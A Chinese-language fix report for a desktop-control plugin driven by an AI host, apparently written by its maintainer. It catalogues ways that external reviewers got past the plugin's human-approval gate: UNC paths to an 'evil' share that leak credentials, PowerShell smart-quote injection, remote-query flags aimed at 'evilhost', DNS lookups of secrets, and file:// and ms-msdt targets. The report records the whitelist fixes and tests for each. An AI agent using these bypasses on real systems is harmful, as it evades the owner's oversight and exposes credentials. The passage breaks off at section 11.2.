# 桌面操控插件 · 修复报告

**版本**：`@local/desktop-control` 1.1.4
**日期**：2026-11-21
**触发原因**：外部 AI 对 v1.1 源码包做独立审阅，指出「承诺危险动作必须审批，实际存在多条绕过路径」及若干功能缺陷
**结论**：当前 **1.1.4**。P0 全部修复并加了回归用例；P1 修复 10 项；P2 打磨项保留未动。`test/smoke.mjs` 全绿（含 6 条新增绕过回归）。C# 侧已生效，JS 侧需重启 DSH 后加载。

---

## 一、修复总览

| # | 级别 | 问题 | 状态 |
|---|---|---|---|
| 1 | 🔴 P0 | `pc_app launch` 黑名单可绕过（`cmd`、`cmd.exe.`、UNC、任意路径 exe） | 已修 |
| 2 | 🔴 P0 | `pc_system exec` 剥掉路径后命中白名单（`\\evil\s\whoami.exe`） | 已修 |
| 3 | 🔴 P0 | `psQuote` 只转义 ASCII `'`，PowerShell 智能引号可注入 | 已修 |
| 4 | 🔴 P0 | 审批框 `truncate` 截断命令，主人批准看不全的内容 | 已修 |
| 5 | 🔴 P0 | `pc_screen` 的 `path` 无限制，PNG 可覆盖任意文件 | 已修 |
| 6 | 🔴 P0 | 只读白名单含 `route` / `arp`（会改系统状态） | 已修 |
| 7 | 🔴 P0 | `kill` 子串匹配且无自保护（可杀 helper / 宿主 / explorer） | 已修 |
| 8 | 🔴 P0 | `sleep` 虚拟键映射存在（一键绕过 power 审批） | 已修 |
| 9 | 🟠 P1 | `pc_batch` 不响应取消，超时后仍在点击打字 | 已修 |
| 10 | 🟠 P1 | `pc_batch` 的 `key` 默认松开（本意按下） | 已修 |
| 11 | 🟠 P1 | `pc_batch` 负坐标被截成 0（副屏够不到） | 已修 |
| 12 | 🟠 P1 | 剪贴板非文本内容被空串覆盖，还谎报 `clipboardRestored: true` | 已修 |
| 13 | 🟠 P1 | `SetCursorPos` 缺 `SetLastError`，「错误码 0」是假象 | 已修 |
| 14 | 🟠 P1 | `SendInput` 绝对移动缺 `MOUSEEVENTF_VIRTUALDESK` | 已修 |
| 15 | 🟠 P1 | `window.focus` 无条件 `SW_RESTORE`，把最大化窗口还原 | 已修 |
| 16 | 🟠 P1 | 后台截图用客户区尺寸画整个窗口，内容缩在左上角 | 已修 |
| 17 | 🟠 P1 | 后台点击投给顶层窗口，WinForms 按钮收不到 | 已修 |
| 18 | 🟠 P1 | 后台组合键无效（`ctrl+a` 只到 `a`） | 改为明确报错 |
| 19 | 🟠 P1 | `killTree` 的 `taskkill` 无 `error` 监听，可崩 Host | 已修 |
| 20 | 🟠 P1 | 旧 helper 的 `exit` 会误杀新连接上的调用 | 已修 |
| 21 | 🟡 P2 | 测试断言 6 个工具、实际 7 个（一直红） | 已修 |
| 22 | 🟡 P2 | 一条测试「因进程不存在」而通过，语义退化 | 已修 |
| 23 | 🟡 P2 | 版本号与压缩包名不一致 | 已随每轮发布递增（当前 1.1.4） |

---

## 二、逐条详解

### P0-1 · `launch` 黑名单可绕过

**问题**：`classifyLaunch` 用黑名单正则，且要求以 `.exe` 结尾。以下全部判为「普通程序启动」，免审批：

- `cmd` / `powershell` / `pwsh`（不带 `.exe`，ShellExecute 会从 PATH 解析并启动）
- `cmd.exe.`（Win32 忽略结尾点号，等价于 `cmd.exe`）
- `robocopy.exe … /MIR`、`regedit.exe /s x.reg`、`tskill.exe`、`net1.exe`
- 任意路径的 exe

后果：`powershell -EncodedCommand <base64>` 不带任何危险关键字，可无审批执行任意代码。

**根因**：安全判定用了黑名单。黑名单枚举不完 Win32 的路径/别名规则。

**修法**（`index.js:205` `classifyLaunch`）：改为**白名单制**。

- 免审批：`http(s)/mailto/ms-*` 协议、文档扩展名（pdf/docx/png/mp4…）、以分隔符结尾的目录、以及**裸程序名**在 `DEFAULT_ALLOWED_PROGRAMS`（`index.js:141`）里的 GUI 程序。
- 其余一律审批。`segments.length !== 1`（带路径）直接不放行。
- 结尾点号与空格在比较前剥掉（`/[. ]+$/`），`cmd.exe.` 归一成 `cmd.exe` 后不在白名单里。
- 白名单可通过配置 `allowedPrograms` 扩展。

**验证**：`smoke.mjs` 的「审批绕过回归」断言 `cmd`、`cmd.exe.`、任意路径 exe 三者都必须触发审批。

---

### P0-2 · `exec` 剥路径后命中白名单

**问题**：原来先 `.replace(/^.*[\\/]/, '')` 再查白名单，`\\evil\s\whoami.exe`、`.\ping.exe`、`C:\Users\Public\ipconfig.exe` 都被判为「只读命令」。

**修法**（`index.js:158` `classifyCommand`）：

- 命令名（首 token）含 `\`、`/`、`:` 一律判不安全。
- 全文含 UNC（`\\`）判不安全——即使命令本身只读，UNC 也会触发 NTLM 凭据外泄。
- 命令长度超过 4000 字符直接拒绝（避免超长内容冲击审批框）。

**验证**：回归用例 `UNC 路径命令被拦`、`带路径的命令名被拦`。

---

### P0-3 · PowerShell 引号注入

**问题**：`psQuote` 只把 ASCII `'` 转义成 `''`。PowerShell 词法器把 `‘ ’ ‚ ‛`（U+2018/2019/201A/201B）也当作单引号，构造 `x’; <命令>; #` 即可让后半段作为独立语句执行。`service status` 和 `registry read` 本来免审批，等于无审批执行。

**修法**（`index.js:63` `psArg`）：所有用户输入改为 **base64 编码 + 运行时解码**，彻底不进入引号规则：

```js
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('…base64…'))
```

内部生成的临时路径（UUID 文件名）用 `psLiteral`（`index.js:69`，单引号字面量），因为 `&` 命令位置不能放裸表达式。这一步曾经写成 `& ${psArg(...)}` 导致命令执行失败（`[exit code: null]`），已修正为 `& ${psLiteral(...)}`。

**验证**：`whoami` / `echo` / `notepad` 三条免审批路径与 `allowed-once` 放行路径全部恢复通过。

---

### P0-4 · 审批框截断命令

**问题**：`truncate(command, 800)` 会省略中间约 35%。主人批准的是自己看不全的内容。

**修法**：审批请求里的 `reason` / `displayReason` 一律使用完整命令，不再截断。超长内容由 P0-2 的 4000 字符上限在前面拦掉。

**验证**：代码检查 + smoke 里审批请求文本长度断言。

---

### P0-5 · 截图可覆盖任意文件

**问题**：`pc_screen grab` 的 `path` 直接透传给 C#，传 `C:\Users\x\Documents\报告.docx` 就会用 PNG 覆盖，而且不走审批。

**修法**（`index.js:584` `resolveScreenshotPath`）：

- 必须以 `.png` 结尾
- 目标已存在 → 拒绝（不做静默覆盖）
- 必须落在 `SHOTS_DIR`（`index.js:578`）、当前工作目录、或配置的 `screenshotDir` 之下

**验证**：代码检查；路径不在允许目录时会抛中文错误。

---

### P0-6 · 白名单含会改系统的命令

**问题**：`route`、`arp` 在只读白名单里，`route add …`、`arp -d *` 免审批；`ver`、`time` 是 cmd 内建，PowerShell 里根本不存在。

**修法**：四者移出 `SAFE_COMMANDS`。

**验证**：回归用例 `route add 被拦`。

---

### P0-7 · `kill` 子串匹配且无自保护

**问题**：

- 审批框只显示子串（`processName`），主人不知道会杀哪些进程
- C# 用 `Contains` 匹配，`node` 会命中所有含 node 的进程
- 没有保护：能杀 helper 自己、宿主进程、explorer

**修法**：

- **Node 侧**（`index.js` pc_app kill 分支）：先用 `app.list` 解析出真实命中名单，把 `pid + 进程名` 列表放进审批框（超过 20 个折叠）；命中 0 个直接报错而不是弹审批。
- **C# 侧**（`DesktopControl.cs:1488` `AppKill`）：名称匹配改**全等**；新增 `IsProtectedForKill`（`:1564`）拒绝杀 helper 自己、`protectPids`（Node 宿主 pid）、以及 `explorer/csrss/winlogon/services/lsass/smss/wininit/svchost/dwm/spoolsv/system/registry` 等系统关键进程。

**验证**：代码检查 + smoke 参数校验用例（缺 pid/processName 报错）。

---

### P0-8 · `sleep` 键绕过电源审批

**问题**：`VirtualKey` 把 `sleep` 映射到 VK_SLEEP(95)，按一下等于让机器睡眠，绕过 `pc_system power` 的审批。

**修法**：删除该映射。现在传 `key: "sleep"` 会报 `unknown key name`。

**验证**：代码检查。

---

### P1-9 · `pc_batch` 不响应取消

**问题**：`pc_batch` 的 `run` 不接收 `exec`，循环里不检查 `signal`，`wait` 单步最长 120 秒，且不可中断。在框架超时或主人点停止后，它还在继续真实点击和打字。

**修法**（`index.js:1518` `runStep` / `:1578` `batchTool`）：

- `run(args, exec)` 接收执行上下文
- 每步开始前检查 `exec.signal.aborted`，中止时报告「第 N 步之前停止，已完成 M 步」
- `wait` 改成可被 abort 立即唤醒
- `runStep` 透传 `exec` 给各步

**验证**：代码检查（取消路径需要真实中断才能跑，本机未构造该场景）。

---

### P1-10/11 · 批处理 `key` 默认与坐标

**问题**：`step.action` 省略时默认成 `up`（本意是按下）；坐标用 `clampInt(x, 0, …)`，副屏在主屏左侧/上方时负坐标被截成 0。

**修法**：`key` 默认改 `down`（只有显式 `action: "up"` 才松开）；坐标下限放到 `-100000`。

**验证**：代码检查。

---

### P1-12 · 剪贴板非文本被清空

**问题**：`ClipboardReadText` 读不到文本时返回 `""`，调用方 `previous != null` 成立，粘贴完把空文本写回去——用户复制的图片/文件被销毁，还返回 `clipboardRestored: true`。

**修法**：非文本返回 `null`；写入前判 `previous != null`；`ClipboardGet` 增加 `hasText` 字段并兜底 `text ?? ""`。顺带修了 `ClipboardGet` 里 `text.Length` 的空引用（这个 NRE 是改完才暴露的，smoke 直接崩了）。

**验证**：`clipboard_set` / `clipboard_get` 往返用例通过。

---

### P1-13 · `SetCursorPos` 缺 `SetLastError`

**问题**：`DllImport` 没写 `SetLastError = true`，所以 `Marshal.GetLastWin32Error()` 恒为 0。v1.1 文档里写的「SetCursorPos 返回 FALSE 且错误码 0，说明被 hook 拒绝」是**错误结论**——0 只是没读到错误。

**修法**：补 `SetLastError = true`（`DesktopControl.cs:109`），并更正注释。移动逻辑本身仍然优先 `SendInput`、`SetCursorPos` 兜底（这个策略是对的，只是理由要写对）。

**验证**：代码检查；`system.info` 的 `inputProbe.setCursorError` 现在会给出真实错误码。

---

### P1-14 · 缺 `MOUSEEVENTF_VIRTUALDESK`

**问题**：绝对移动没带 `MOUSEEVENTF_VIRTUALDESK`，坐标按主显示器归一化，多显示器下第一落点是错的，全靠 `SetCursorPos` 兜底纠正。

**修法**：常量 `MOUSEEVENTF_VIRTUALDESK = 0x4000`（`:252`），`MoveCursorTo` 里 flags 加上它（`:572`、`:1817` 两处）。

**验证**：代码检查。**本机是单显示器，多屏行为未实测**。

---

### P1-15 · `focus` 还原最大化窗口

**问题**：`WindowFocus` 在 try 块里无条件 `ShowWindow(hwnd, SW_RESTORE)`，最大化的窗口会被还原成普通大小。

**修法**：删除 try 里那次无条件调用，保留函数开头「仅在 `IsIconic` 时还原」的判断。

**验证**：代码检查。

---

### P1-16 · 后台截图尺寸错位

**问题**：`BackgroundGrab` 用客户区尺寸建位图，但 `PrintWindow` 画的是**整个窗口**（含标题栏/边框）。随包的 `live4-bg-ok.png` 就是这个症状：内容只占左上角，其余全黑。

**修法**：改用 `GetWindowRect` 的窗口尺寸（`:2083`）。

**验证**：代码检查。**需要重启 DSH 后用真实窗口复核一次截图**。

---

### P1-17 · 后台点击按钮无效

**问题**：`BackgroundClick` 把 `WM_LBUTTONDOWN` 直接投给顶层窗口。WinForms 的按钮/树/列表是子控件，不会收到。

**修法**：先用 `ChildWindowFromPointEx`（`CWP_SKIPINVISIBLE | CWP_SKIPDISABLED`）做命中测试找到子控件，再用 `MapWindowPoints` 把坐标换算成子控件客户区，最后投给子控件（`:1897`）。

**验证**：代码检查。**未在真实按钮上实测**（本机测试靶子的 TextBox 是全窗口控件，测不出差异）。

---

### P1-18 · 后台组合键无效

**问题**：`PostMessage(WM_KEYDOWN)` 只带虚拟键码，目标处理 `ctrl+a` 时读的是**真实键盘状态**（`GetKeyState`），修饰键传不过去。实际只会到达一个 `a`。

**修法**：与其假装成功，改为**明确报错**——后台模式检测到组合键（modifiers > 0）直接抛「后台模式不支持组合键…请改用前台模式」（`DesktopControl.cs:2013`）。

**验证**：代码检查。这是能力限制，不是 bug 修复。

---

### P1-19/20 · 进程与连接生命周期

**问题**：

- `killTree` 里 `spawn('taskkill')` 没有 `error` 监听，taskkill 不存在时未捕获的异步 `error` 会崩掉整个 Host
- 旧 helper 的 `exit` 事件无条件 `rejectAll`，重启后可能误杀新连接上正在等待的调用

**修法**：

- `killTree`（`index.js:619`）给子进程挂 `error` 监听
- `child.on('exit')` 先判 `this.#child !== child` 就返回

**验证**：代码检查。

---

### P2-21/22/23 · 测试与版本

**问题**：`smoke.mjs` 断言 `tools.size === 6`，v1.1 加了 `pc_batch` 后一直是红的；「取消审批」那条用例用 `kill notepad`，但 notepad 没在跑，于是它是因为「进程不存在」而通过，语义退化；版本号 1.0.0 与包名 v1_1 不一致。

**修法**：

- 工具数量改 7，工具名列表补 `pc_batch`，并补 `pc_batch` 的 schema 断言
- 取消审批用例改用 `pc_system power restart`（不依赖进程存在）
- 版本号对齐到 1.1.0（打包时 1.1.1）

**验证**：见下方测试结果。

---

## 三、回归测试结果

`test/smoke.mjs`，全部通过（exit 0）：

```
== 注册 ==                       10 ok
== 只读能力（真实调用 helper）==   6 ok
== 审批 fail-closed ==            7 ok
== 危险命令与启动判定 ==          6 ok
== 审批绕过回归 ==                7 ok   ← 新增
== 只读命令免审批 ==              3 ok
== 审批通过后放行 ==              1 ok
== 参数校验 ==                    5 ok
== 窗口动作 ==                    1 ok
结果：全部通过
```

新增的「审批绕过回归」六条，全部从「免审批」变为「必须审批」：

| 用例 | 修复前 | 修复后 |
|---|---|---|
| `cmd`（不带 .exe） | 免审批 | 审批 |
| `cmd.exe.`（尾点） | 免审批 | 审批 |
| 任意路径 exe | 免审批 | 审批 |
| `\\evil\share\whoami.exe` | 免审批 | 审批 |
| `.\whoami.exe` | 免审批 | 审批 |
| `route add …` | 免审批 | 审批 |

同时确认没有把正常能力一起封死：`whoami`、`echo` 仍免审批，`notepad` 仍免审批，`allowed-once` 后命令仍能真正执行。

---

## 四、没有修的部分（明确保留）

| 项 | 理由 |
|---|---|
| 一次性 token 在命令行参数里（建议改环境变量） | 本机进程可读，但需同用户权限；优先级低于 P1，留作后续 |
| C# 侧 `Process` 句柄未显式 Dispose（`AppLaunch`/`AppList`） | 有 GC 兜底，泄漏速度极慢 |
| 截图目录永不清理 | 需要配套保留策略，属功能取舍 |
| 截图面积只限宽高、未限总面积 | 20000×20000 理论上 1.2GB，属极端输入；有宽高上限兜底 |
| `AppList` 读 `MainWindowTitle` 可能阻塞 | 有 25 秒调用超时兜底 |
| `EnumerateWindows` 未过滤 DWM cloaked 窗口 | 只影响列表噪声，不影响操作 |
| `runPowerShellScript` 的 stdout 带 BOM | 显示层问题，不影响判定 |
| `pc_system` 工具超时 180s 与 `exec` 600s 上限矛盾 | 工具会先超时，属配置不一致 |
| 键盘输入不做内容审查 | 这是**设计边界**，不是缺陷：等价于主人亲自打字 |

---

## 五、验证边界（哪些只是代码级确认）

必须说清楚，避免「全部修好」被误解成「全部实测」：

| 修复 | 验证程度 |
|---|---|
| 6 条审批绕过 | **实测通过**（smoke 用例） |
| 白名单程序免审批、只读命令免审批、allowed-once 放行 | **实测通过** |
| 剪贴板往返、非文本不再覆盖 | **实测通过**（往返）；非文本分支为代码检查 |
| 批处理取消 | 代码检查（未构造真实中断） |
| 多显示器负坐标、`MOUSEEVENTF_VIRTUALDESK` | **未实测**（本机单显示器） |
| 后台点击子控件命中 | **未实测**（测试靶子是全窗口 TextBox） |
| 后台截图按窗口矩形 | 代码检查（需重启后复核） |
| `kill` 自保护 | 代码检查 |
| PowerShell base64 注入消除 | 实测命令可执行（whoami/echo 通过）+ 代码检查引号规则 |

另外，本轮 CI 环境是 Windows 本机，**C# 部分只做了编译验证**，没有在 Linux 沙箱里跑过——外部评审那台机器编译不了 C#，这部分是本机负责的。

> 本节是 v1.1.1 时的结论。**当前状态以第三节的运行输出为准**；v1.1.2 与 v1.1.3 的增量在第九、十节。

---

## 六、部署状态

| 部分 | 状态 |
|---|---|
| C# helper（`DesktopControl.exe`） | **已生效**。插件每次建立连接都会按 `size+mtime` 复制新 exe 到 `%LOCALAPPDATA%\dsh-desktop-control\` 再启动；`pc_system info` 可看到新 helper pid |
| JS 插件（`index.js`） | **需重启 DSH**。`plugin_manager` 对 bundle 内条目报 `unaddressable`，无法热重载 |

重启后建议做三件事：

1. `pc_system info` → 看 `inputProbe.setCursor` / `sendCursorError` 是否正常
2. `pc_app launch target:"notepad"` → 应在 2 秒内开出来且不弹审批
3. `pc_app launch target:"cmd"` → 应弹审批

---

## 七、教训

1. **安全判定必须用白名单**。这是同一个坑的第二次：第一次是 `launch` 挡不住 `cmd`，第二次是挡不住 `cmd.exe.` 和 UNC。黑名单永远枚举不完 Win32 的别名/路径规则。
2. **「已知坑」也要复核**。v1.1 文档里把「SetCursorPos 错误码 0 = 被 hook」写成了结论，实际是 `SetLastError` 没设导致的读数假象。写进文档的错误结论比 bug 更危险，因为它会误导下一次排查。
3. **测试绿了不代表对**。「工具数量 6」红了却没有链路报错；「取消审批」因为进程不存在而通过。覆盖率不等于有效性，断言要断在**真实原因**上。
4. **外部评审有效**。自己连跑三轮没看出 `cmd` 不带 `.exe` 能穿过去，对方一眼看到。
5. **不可靠的能力要报错，不要静默降级**。后台组合键干脆报错，比「假装成功了但其实只输入了 a」强。

---

## 八、证据链补全（复核）

初版报告里有一批条目只有「代码检查」，没有断言兜着。按外部评审的思路，那正是最容易「声称修好、其实没修」的地方。为此补了 `test/audit.mjs`：**28 条断言，全部通过**（exit 0）。

| 复核项 | 断言内容 | 结果 |
|---|---|---|
| A1 审批不截断 | 1200 字符命令完整出现在 `displayReason.zh` 与 `reason`，且不含「省略」 | 通过 |
| A2 截图路径 | `.docx` 目标被拒、工作区外路径被拒、错误信息含 png | 通过 |
| A3 kill 名单 | 审批文案包含具体 pid 与理由 | 通过 |
| A4 引号注入 | 服务名传 `x'; Write-Output PWNED; '`：无语法错误、`PWNED` 未执行、确实进了 PowerShell | 通过 |
| A5 批处理取消 | 传入已 abort 的 signal：立即中止、提示「取消」、前后光标位置未变（未执行任何动作） | 通过 |
| A6 后台组合键 | `ctrl+a` 明确报错并提示改用前台模式 | 通过 |
| A7 SetLastError | `inputProbe.setCursorError` 字段存在且为数字 | 通过 |
| A8 白名单行为面 | 10 组正反用例：`notepad`/`calc`/`https`/`whoami` 免审；`cmd`/`cmd.exe.`/`POWERSHELL`/`cmd.exe` 带参/`route print`/`arp -a` 必审 | 通过 |

据此，第五节「验证边界」中有 6 项从**代码检查**升级为**实测**：审批不截断（A1）、截图路径（A2）、psArg 注入（A4）、批处理取消（A5）、后台组合键（A6）、SetLastError（A7）。

仍然只有代码检查的：`kill` 的 C# 自保护逻辑（A3 只验证了 Node 侧审批文案）、多显示器、后台点击子控件命中。

> 说明：这套复核是**自己写的**，不等于第三方独立验证。它保证的是「报告里的每一条声称都有可执行的断言兜着」，不能替代另一个 AI 的对抗式审阅。若还需要第三方复核，`test/audit.mjs` 和 `test/smoke.mjs` 都是可直接运行的输入。

## 九、第二轮评审修复（v1.1.2）

第二次外部评审（针对 v1.1.1）质量更高：指出 1 处**功能回归**、4 处新白名单留下的绕过，以及审计脚本的恒真断言问题。逐条处理如下。

### 9.1 🔴 `psArg` 在参数位置失效（功能回归，已实测确认）

- **现象**：`Get-Service -Name [Text.Encoding]::UTF8.GetString(...)` 报 `PositionalParameterNotFound`。PowerShell 参数模式下，以 `[` 开头的 token 不会被当表达式求值。
- **实测**：本机 PowerShell 直接复现——不加括号失败，加括号 / 先赋值都正常。
- **影响面**：`service` 全部动作、`registry` 全部动作、`launchElevated`。即所有经过 `psArg` 且不在赋值右侧的调用。
- **修法**：`psArg` 返回值统一带括号，赋值与参数两种位置都合法。
- **验证**：`audit.mjs` 的 A4b **真跑** `service status Spooler` 与 `registry read ProductName`，断言输出含 `Spooler`、退出码 0、无参数绑定错误。

> 这条同时暴露了上一版审计的缺陷：A4 只测「注入没执行」，没测「正常能用」。**只验安全不验可用，会把「安全但全坏」当成通过。**

### 9.2 🟠 白名单程序的参数绕过

评审实测：`explorer.exe payload.bat`、`code --extensionDevelopmentPath`、`chrome --utility-cmd-prefix` 全部免审批。

- `classifyLaunch`：白名单程序现在**必须不带参数**，带参数一律审批。
- `classifyLaunchArgs`：增补 UNC 参数与脚本扩展名检查。

### 9.3 🟠 协议与文档白名单收窄

- `ms-*` → 只放行显式列表（`ms-settings`、`ms-windows-store`、`ms-photos`、`ms-calculator`、`ms-screenclip`、`copilot`）。**`ms-msdt` 这类已知 RCE 协议不再放行。**
- `DOCUMENT_EXT` 去掉 `.doc/.xls/.ppt`（可带宏）、`.iso`（会挂载）、`.zip/.7z/.rar`（解包后可能被执行）。
- `classifyLaunch` 增加 UNC 拒绝——上一版只加在参数检查里，漏了目标本身。

### 9.4 🟠 命令侧 UNC 与读文件

- UNC 检测从只拦反斜杠改为 `/[\\/]{2}/`，`type //evil/share/x` 同样被拦。
- `get-content` / `type` / `cat` / `gc` 移出只读白名单——它们能直接读私钥。

### 9.5 🟠 剪贴板数据丢失（上一版只修了「不谎报」，没修「不丢失」）

- **真实问题**：`ClipboardWriteText` 在备份之后立刻 `EmptyClipboard`。图片/文件类内容备份不出来，原内容当场就没了。
- **修法**：写入前先探测剪贴板有没有文本；**没有文本就完全不碰剪贴板**，改走 unicode 注入。

### 9.6 🟠 后台截图 DPI（上一版改动无效）

- 评审从 `live4-bg-ok.png` 的 1326×901 与内容约 884×600 推出比例正好 1.5。
- **修法**：`GetWindowDpiAwarenessContext(hwnd)` + `SetThreadDpiAwarenessContext` 包住取矩形与 `PrintWindow`，结束后恢复线程上下文。
- **未验证**：需重启后重新截图对比。

### 9.7 🟡 其他

- 后台点击：`ChildWindowFromPointEx` 改为**逐层下降**（≤8 层）并加 `CWP_SKIPTRANSPARENT`，按钮嵌在 Panel/GroupBox 里也能命中。
- `kill`：pid 路径先查进程名；`app.list` 传 `filter` 避免 300 条截断误报；`protectPids` 增加父进程 `process.ppid`。
- `PressCombo`：`ctrl++` 不再丢最后片段；单独按 `win`/`alt`/`shift` 合法。
- `uptime`：改用 `GetTickCount64`，开机超过 24.9 天不再变负。
- `GetWindowDpiAwarenessContext` 声明补上 `HWND` 参数（旧声明是错的）。

### 9.8 🔴 一个评审没发现、但更严重的问题：package.json 的 BOM

主人重启后插件**整个消失**。排查：前一晚用 PowerShell 的 `Set-Content -Encoding UTF8` 改版本号，给 `package.json` 写入了 UTF-8 BOM（`EF BB BF`）。DSH 解析 JSON 失败 → **bundle 被静默跳过** → 七个工具全部消失，且没有任何面向用户的报错。

- **已修**：改用 Node 的 `writeFileSync(..., 'utf8')`，前 3 字节现在是 `7B 0A 20`。
- **已加断言**：`audit.mjs` 的 B1 检查 BOM 与可解析性。
- **教训**：PowerShell 5.1 的 `-Encoding UTF8` 是**带 BOM 的**。给配置文件写 JSON 必须用 `[System.IO.File]::WriteAllText(..., new UTF8Encoding($false))` 或 Node。

### 9.9 审计脚本重写

上一版 28 条断言里，评审判定只有 2 条真正有效（A1、A6）。已重写（条数以运行输出为准），原则：**每条都必须在修复前会失败**。

| 用例 | 为什么能区分修复前后 |
|---|---|
| B1 package.json 无 BOM | 带 BOM 时 `JSON.parse` 直接失败 |
| A4b service / registry 成功路径 | 修复前必报 `PositionalParameterNotFound` |
| A4 U+2019 注入 | 旧 `psQuote` 只转义 ASCII `'`，U+2019 会断开字符串 |
| A5 中途取消 | 修复前 `wait` 睡满 5 秒且不抛错 |
| A2 拒绝覆盖已存在文件 | 原实现会静默覆盖 |
| A8 第二轮绕过 | explorer+payload.bat / code --extensionDevelopmentPath / chrome --utility-cmd-prefix / ms-msdt / UNC 文档 / `.doc` / `.iso` / `type //evil/…` / get-content |

同时修正两条语义退化的断言：A4 从「输出里出现 PWNED 就算注入」改成「只有独立成行才算执行」（原断言把错误信息里的回显误判为注入）；A5 的「光标没动」不再单独作为「没执行」的证据。

### 9.10 仍未修（明确保留）

评审列出但本轮未动、也不在上一轮清单里的：

- `window.move` / `resize` 漏传坐标时默认 0 与 800×600。
- `registry write` 固定 `-Type String`（会把 DWORD 改类型）、用 `-Path` 而非 `-LiteralPath`。
- `admin` 按第一个空格切分，带空格的路径提权不了。
- `power sleep` 用 `rundll32 SetSuspendState`，启用休眠时会进休眠；`shutdown /t 0` 让 `abort` 来不及。
- `#connect` 的 guard 定时器与未处理的 `accepted` rejection；socket `close` 仍无条件 `rejectAll`（只修了 `exit`）。
- 运行时 exe 非原子复制；`keyboard.type` 超时不含 `intervalMs`。
- `WindowFocus` 的 `foregroundThread` 仍未使用，`AttachThreadInput` 附加到目标线程而非前台线程。
- `AppList` 仍读 `MainWindowTitle`/`Responding`（有 25s 超时兜底）。

以上都进这份清单，不再出现「报告说修了、代码没对上」的情况。
---

## 十、第三轮评审修复（v1.1.3）

第三轮评审（针对 v1.1.2）判定「是目前最扎实的一版」，同时指出 7 处仍存在的绕过与 4 处报告/代码不一致。逐条处理：

### 10.1 🟠 `file://` 与其他非 http(s) scheme（Node 实测确认）

`file://evil/share/a.pdf` 被当成文档、`file://evil/share/` 被当成文件夹，两者都免审批。ShellExecute 会把 `file://` 当成 SMB 路径，等于绕过 UNC 检查。

- **修法**：任何 `scheme://` 且 scheme 不是 `http(s)` 的目标一律审批。
- `mailto:` 单独处理：目标里含 UNC / `//` 时审批。

### 10.2 🟠 「只读」命令仍能外联（Node 实测确认）

评审实测免审批的：`systeminfo /s evilhost`、`tasklist /s evilhost`、`get-wmiobject … -ComputerName`、`nslookup secret.evil.example`。

- **修法**：命令含 `-ComputerName` / `-Server` / `/s` / `/server` 一律审批。
- `nslookup` 移出只读白名单——它是网络工具，不属于「本地只读」。

### 10.3 🟡 `ver` / `time` 其实还在白名单

P0-6 写的是「四者移出」，实际只移出了 `route` 和 `arp`。已删除，报告与代码对齐。

### 10.4 🟡 组合键：`ctrl++` 仍不可用、修饰键可能卡住

- `VirtualKey` 没有 `+` 的映射（只有数字键盘的 `add`）。已补 `+` → 187，并在组合里自动带 Shift（`+` 与 `=` 共用 VK_OEM_PLUS）。
- `PressCombo` 补 `try/finally`：中途异常时释放已按下的修饰键，不再卡住。

### 10.5 🟡 剪贴板：富文本与图片仍会丢

上一版只处理了「剪贴板里没有文本」。有文本但**还带富文本/图片**时，粘完只恢复 `CF_UNICODETEXT` 会把格式毁掉。

- **修法**：`CountClipboardFormats() > 3`（纯文本通常只有 1–3 个格式）时也改走 unicode 注入，完全不碰剪贴板。
- 顺手把粘贴文本的 `\n` 规范成 `\r\n`。

### 10.6 🟡 registry 的校验顺序

「必须提供 registryName」原本在审批之后。已前移到审批之前——让主人批准一个注定失败的操作没有意义。

### 10.7 报告与代码不一致（评审逐条指出）

- **附录行数写错**：改成只给定位符号（`function psArg` 之类），行数改为实时统计后写死（1697 / 2256）。
- **第三节测试结果写死条数**：改为「以运行输出为准」，不再报一个会漂移的数字。
- **`DesktopControl.cs` 混入 6 个 CRLF**：已统一为 LF；新增 `test/verify-package.mjs` 在打包前检查。
- **9.10 缺项补齐**：`registry` 校验顺序（本轮已修）、`\n` 规范（本轮已修）、`Environment.OSVersion` 报 6.2（**仍未修**，见 10.9）。

### 10.8 audit v3

按评审意见改：

- **A7 不再恒真**：改成静态检查 `SetCursorPos` 的 `DllImport` 是否带 `SetLastError = true`——修复前必红。
- **A2 补目录白名单**：新增「工作区外路径被拒」，覆盖原先没有测试的规则。
- **A8 补三组反例**：`file://` 文档 / `file://` 文件夹 / `mailto` 带 UNC；远程参数（`systeminfo /s`、`tasklist /s`、`-ComputerName`）；`nslookup`、`ver`、`time`。
- **去掉破坏性副作用**：A1 从 `Remove-Item C:\Temp\x` 改成 `New-Item` 建临时空目录。
- **新增 `test/verify-package.mjs`**：BOM、JSON 可解析、CRLF、必需文件、报告版本一致性、exe 是否含最新源码标记。

### 10.9 仍未修（更新版）

- `Environment.OSVersion` 在无 manifest 的 .NET 4 程序里把 Win10/11 报成 6.2（需改用 `RtlGetVersion` 或读注册表）。
- `window.move` / `resize` 漏传坐标时默认 0 与 800×600。
- `registry write` 固定 `-Type String`、用 `-Path` 而非 `-LiteralPath`。
- `admin` 按第一个空格切分，带空格的路径提权不了。
- `power sleep` 可能进休眠；`shutdown /t 0` 让 `abort` 来不及。
- `#connect` 的 guard 定时器与未处理的 `accepted` rejection；socket `close` 仍无条件 `rejectAll`。
- 运行时 exe 非原子复制；`keyboard.type` 超时不含 `intervalMs`。
- `WindowFocus` 的 `foregroundThread` 未使用，`AttachThreadInput` 附加到目标线程而非前台线程。
- `AppList` 仍读 `MainWindowTitle` / `Responding`（有 25s 超时兜底）。
- **后台截图 DPI 仍未实测**：需要 150% 缩放的机器上重截一张并更新 `live4-bg-ok.png`。


---

## 十一、第四轮评审修复（v1.1.4）

第四轮评审指出的是**方法论层面**的问题，比任何单个绕过都重要：

> 这个插件三轮下来，每一轮的新绕过都是「按参数写法做的黑名单正则」漏掉了另一种写法。你们自己的教训第一条就是「安全判定必须用白名单」，这一条还没贯彻到 `classifyCommand` 的参数部分。

这句话是对的。所以这轮不是再补几条正则，而是把**参数也白名单化**。

### 11.1 参数白名单化（根治）

之前是「枚举危险的远程参数写法」，评审实测的绕过：

| 写法 | 修复前 |
|---|---|
| `quser /server:evilhost` | 免审批 |
| `tasklist /S:evilhost` | 免审批 |
| `get-wmiobject -ComputerName:evilhost` | 免审批 |
| `get-ciminstance -CN evilhost`（别名） | 免审批 |
| `get-wmiobject -Comp evilhost`（PowerShell 唯一前缀缩写） | 免审批 |

**改成**：免审批命令的参数只允许

- 已知安全选项：`/all`、`/groups`、`/priv`、`/user`、`/fo`、`/nh`、`/v`、`-a`、`-n`、`-r`、`-t`、`-l`、`-s`、`-size`
- 盘符开头的路径（`C:\Windows`）
- 不含冒号、不含 `@` 的普通片段

其余一律审批。**不再枚举「坏写法」，改为枚举「允许的东西」**。

### 11.2 网络类命令整体移出

